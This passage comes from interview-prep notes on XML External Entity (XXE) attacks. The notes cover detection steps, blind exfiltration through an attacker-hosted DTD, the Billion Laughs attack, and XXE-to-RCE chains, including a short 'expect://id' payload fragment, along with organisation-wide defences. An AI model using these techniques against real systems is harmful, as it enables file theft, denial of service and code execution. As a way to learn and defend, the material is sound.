**A:** I'd follow a systematic approach: (1) Identify XML input points — check Content-Type headers, file uploads, SOAP endpoints, SAML flows. (2) Try injecting an internal entity to confirm DTD processing. (3) Use OOB callbacks (Burp Collaborator) to detect blind XXE. (4) Try Content-Type switching on JSON endpoints to see if the server also accepts XML. (5) Test file uploads with SVG/DOCX containing XXE payloads.

### Q4: How do you exploit XXE when output is not reflected?

**A:** This is Blind XXE. Two main techniques: (1) *OOB exfiltration* — host a malicious DTD on my server that uses parameter entities to read a file and send its contents via HTTP/FTP to my server. (2) *Error-based* — trigger a file-not-found error where the file contents appear in the error message. If neither works, I'd try the local DTD redefine trick for air-gapped environments.

### Q5: As a security engineer, how would you prevent XXE across an entire organization?

**A:** Multi-layered approach: (1) *Secure defaults* — establish a secure XML parser configuration library/wrapper that all teams use, with DTDs and external entities disabled. (2) *Code review standards* — add XXE checks to code review checklists and SAST rules (Semgrep/SonarQube). (3) *Prefer JSON* — migrate APIs from XML to JSON where possible. (4) *WAF rules* — block DOCTYPE/ENTITY keywords at the edge. (5) *DAST scanning* — include XXE tests in CI/CD pipeline. (6) *Training* — educate developers on secure XML parsing. (7) *IMDSv2* — enforce token-based cloud metadata to reduce SSRF impact.

### Q6: What is the Billion Laughs attack?

**A:** It's an XML-based DoS attack using nested entity expansion. Each entity references another entity 10 times, creating exponential growth. A small XML document (a few KB) expands to gigabytes in memory, crashing the parser. The fix is to limit entity expansion depth/count or disable DTDs entirely.

### Q7: Can XXE lead to RCE? How?

**A:** Yes, in specific scenarios: (1) PHP with the `expect://` wrapper enabled — `SYSTEM "expect://id"` executes commands. (2) Java with `jar://` scheme can trigger deserialization of malicious archives. (3) XXE → SSRF chain to internal services that allow code execution (e.g., Redis, Jenkins). Direct RCE via XXE is rare, but chaining it with other vulnerabilities makes it possible.

### Q8: How is XXE different from XSS and SQLi?

**A:** XXE targets the *XML parser* on the server side — it's about abusing XML's built-in entity feature, not injecting code into web pages (XSS) or databases (SQLi). XXE is unique because the "injection" is actually a *legitimate XML feature* being misused. The fix is configuration-based (disable dangerous features), unlike XSS/SQLi which require input sanitization and parameterized queries.

---

*Prepared for Gayatri Rachakonda | April 2026*
*OWASP Top 10 • Bug Bounty • FAANG Interview Prep*
